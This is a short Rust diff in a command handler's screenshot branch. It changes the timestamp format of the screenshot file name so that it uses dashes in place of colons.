@@ -287,7 +287,7 @@ impl FleaCommand for CommandProcessor
             SEND_PIC_COMMAND =>
             {
                 let now: DateTime<Utc> = Utc::now();
-                let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H:%M:%S"));
+                let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H-%M-%S"));
                 let current_path = env::temp_dir().as_path().join(file_name);
 
                 match self.take_screenshot(&current_path.to_str().unwrap()) 
